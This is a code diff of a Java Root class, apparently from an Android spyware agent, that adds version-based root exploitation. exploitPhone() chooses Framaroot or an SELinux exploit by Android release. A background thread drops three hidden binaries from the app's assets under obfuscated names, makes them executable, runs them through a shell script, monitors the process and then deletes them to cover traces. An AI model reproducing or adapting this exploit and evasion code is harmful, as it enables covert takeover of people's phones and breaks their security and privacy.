@@ -46,7 +46,111 @@ public class Root {
 
 		return false;
 	}
+	
+	static public boolean shouldAskForAdmin() {
+		boolean ret = false;
+		
+		if (Root.isRootShellInstalled() == true) {
+			ret = false;
+		} else if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) { // <= 2.1 is a bit too old
+			ret = false;
+		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO && android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
+			ret = !checkFramarootExploitability();
+		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH - JELLY_BEAN_MR1 
+			ret = !(checkFramarootExploitability() || checkSELinuxExploitability());
+		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
+			ret = !checkSELinuxExploitability();
+		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
+			ret = true;
+		}
+		
+		if (ret) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(shouldAskForAdmin): Asking admin privileges");
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(shouldAskForAdmin): No need to ask for admin privileges");
+			}
+		}
+		
+		return ret;
+	}
+	
+	static public void exploitPhone() {
+		if (Root.isRootShellInstalled() == true) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(exploitPhone): root shell already installed, no need to exploit again");
+			}
+			
+			return;
+		}
+		
+		if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) { // <= 2.1 is a bit too old
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(exploitPhone): Android <= 2.1, version too old");
+			}
 
+			return;
+		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO && android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
+			// Framaroot
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(exploitPhone): Android 2.2 to 3.2 detected attempting Framaroot");
+			}
+
+			if (checkFramarootExploitability()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
+				}
+
+				framarootExploit();
+			}
+		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH - JELLY_BEAN_MR1 
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(exploitPhone): Android 4.0 to 4.2 detected attempting Framaroot then SELinux exploitation");
+			}
+
+			if (checkFramarootExploitability()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
+				}
+
+				framarootExploit();
+			}
+
+			if (PackageInfo.checkRoot() == false) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(exploitPhone): Framaroot exploitation failed, using SELinux exploitation");
+				}
+
+				if (checkSELinuxExploitability()) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
+					}
+
+					selinuxExploit();
+				}
+			}
+		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(exploitPhone): Android 4.3 detected attempting SELinux exploitation");
+			}
+
+			if (checkSELinuxExploitability()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
+				}
+
+				selinuxExploit();
+			}
+		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
+			// Nada
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(exploitPhone): Android >= 4.4 detected, nope nope");
+			}
+		}
+	}
+		
 	static public void adjustOom() {
 		if (Status.haveRoot() == false) {
 			if (Cfg.DEBUG) {
@@ -338,104 +442,15 @@ public class Root {
 			return false;
 		}
 	}
-	
-	static public boolean selinuxExploit() {
-		final File filesPath = Status.getAppContext().getFilesDir();
-		final String path = filesPath.getAbsolutePath();
-		final String localExploit = M.e("vs"); // selinux_exploit
-		final String selinuxSuidext = M.e("qj"); // selinux_suidext
-		final String suidext = M.e("ss"); // suidext (standard)
+
+	static public void selinuxExploit() {
+		// Start exploitation thread
+		selinuxExploitThread selinuxThread = new selinuxExploitThread();
+		Thread exploit = new Thread(selinuxThread);
+		exploit.start();
 		
-		InputStream streamExpl = Utils.getAssetStream("g.bin"); // selinux_exploit
-		InputStream streamSelinuxSuidext = Utils.getAssetStream("j.bin"); // selinux_suidext
-		InputStream streamSuidext = Utils.getAssetStream("s.bin"); // suidext (standard)
-
-		try {
-			fileWrite(localExploit, streamExpl, Cfg.RNDDB);
-			fileWrite(selinuxSuidext, streamSelinuxSuidext, Cfg.RNDDB);
-			fileWrite(suidext, streamSuidext, Cfg.RNDDB);
-
-			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
-			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + selinuxSuidext);
-			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
-
-			// Run SELinux exploit
-			// - argv[1]: path assoluto alla nuova shell
-		    // - argv[2]: path assoluto alla vecchia shell
-			String pack = Status.getAppContext().getPackageName();
-
-			String script = M.e("#!/system/bin/sh") + "\n"
-					+ String.format(M.e("/data/data/%s/files/vs /data/data/%s/files/qj /data/data/%s/files/ss"), pack, pack, pack) + "\n";
-
-			if (Root.createScript("fig", script) == true) {
-				Process runScript = Runtime.getRuntime().exec(path + "/fig");
-
-				// Non serve
-				runScript.waitFor();
-				
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(selinuxExploit): " + runScript.getClass());
-				}
-			
-				// Monitor exploit execution
-				boolean finished = true;
-				long curTime = System.currentTimeMillis();
-				
-				while (System.currentTimeMillis() < curTime + (1000 * 60 * 8)) {
-					ExecuteResult result = Execute.execute("ps");
-					
-					for (String s : result.stdout) {
-					    if (s.contains("/files/vs")) {
-					    	if (Cfg.DEBUG) {
-								Check.log(TAG + "(selinuxExploit): exploitation in progress");
-							}
-					    	
-					    	finished = false;
-					    	break;
-					    }
-					}
-					
-					if (finished || Root.isRootShellInstalled()) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(selinuxExploit): exploitation terminated after " + (System.currentTimeMillis() - curTime) / 1000 + " seconds");
-						}
-						
-						break;
-					}
-					
-					
-					finished = true;
-					Utils.sleep(5000);
-				}
-
-				Root.removeScript("fig");
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " ERROR: (selinuxExploit), cannot create script");
-				}
-			}
-
-			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
-			file.delete();
-
-			file = new File(Status.getAppContext().getFilesDir(), selinuxSuidext);
-			file.delete();
-
-			file = new File(Status.getAppContext().getFilesDir(), suidext);
-			file.delete();
-			
-			return true;
-		} catch (final Exception e1) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e1);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(e1);//$NON-NLS-1$
-				Check.log(TAG + " (selinuxExploit): Exception"); //$NON-NLS-1$
-			}
-
-			return false;
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(selinuxExploit): exploitation thread running");
 		}
 	}
 
@@ -786,5 +801,107 @@ public class Root {
 
 		Status.setRoot(isRoot);
 	}
+}
 
+class selinuxExploitThread implements Runnable {
+	private static final String TAG = "Root";
+	
+	@Override
+	public void run() {
+		final File filesPath = Status.getAppContext().getFilesDir();
+		final String path = filesPath.getAbsolutePath();
+		final String localExploit = M.e("vs"); // selinux_exploit
+		final String selinuxSuidext = M.e("qj"); // selinux_suidext
+		final String suidext = M.e("ss"); // suidext (standard)
+
+		InputStream streamExpl = Utils.getAssetStream("g.bin"); // selinux_exploit
+		InputStream streamSelinuxSuidext = Utils.getAssetStream("j.bin"); // selinux_suidext
+		InputStream streamSuidext = Utils.getAssetStream("s.bin"); // suidext (standard)
+
+		try {
+			Root.fileWrite(localExploit, streamExpl, Cfg.RNDDB);
+			Root.fileWrite(selinuxSuidext, streamSelinuxSuidext, Cfg.RNDDB);
+			Root.fileWrite(suidext, streamSuidext, Cfg.RNDDB);
+
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + selinuxSuidext);
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
+
+			// Run SELinux exploit
+			// - argv[1]: path assoluto alla nuova shell
+			// - argv[2]: path assoluto alla vecchia shell
+			String pack = Status.getAppContext().getPackageName();
+
+			String script = M.e("#!/system/bin/sh") + "\n"
+					+ String.format(M.e("/data/data/%s/files/vs /data/data/%s/files/qj /data/data/%s/files/ss"), pack, pack, pack) + "\n";
+
+			if (Root.createScript("fig", script) == true) {
+				Process runScript = Runtime.getRuntime().exec(path + "/fig");
+
+				// Non serve
+				runScript.waitFor();
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(selinuxExploit): " + runScript.getClass());
+				}
+
+				// Monitor exploit execution
+				boolean finished = true;
+				long curTime = System.currentTimeMillis();
+
+				while (System.currentTimeMillis() < curTime + (1000 * 60 * 8)) {
+					ExecuteResult result = Execute.execute("ps");
+
+					for (String s : result.stdout) {
+						if (s.contains("/files/vs")) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + "(selinuxExploit): exploitation in progress");
+							}
+
+							finished = false;
+							break;
+						}
+					}
+
+					if (finished || Root.isRootShellInstalled()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(selinuxExploit): exploitation terminated after " + (System.currentTimeMillis() - curTime) / 1000 + " seconds");
+						}
+
+						break;
+					}
+
+
+					finished = true;
+					Utils.sleep(5000);
+				}
+
+				Root.removeScript("fig");
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " ERROR: (selinuxExploit), cannot create script");
+				}
+			}
+
+			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
+			file.delete();
+
+			file = new File(Status.getAppContext().getFilesDir(), selinuxSuidext);
+			file.delete();
+
+			file = new File(Status.getAppContext().getFilesDir(), suidext);
+			file.delete();
+		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);//$NON-NLS-1$
+				Check.log(TAG + " (selinuxExploit Thread): Exception"); //$NON-NLS-1$
+			}
+
+			return;
+		}
+	}
 }
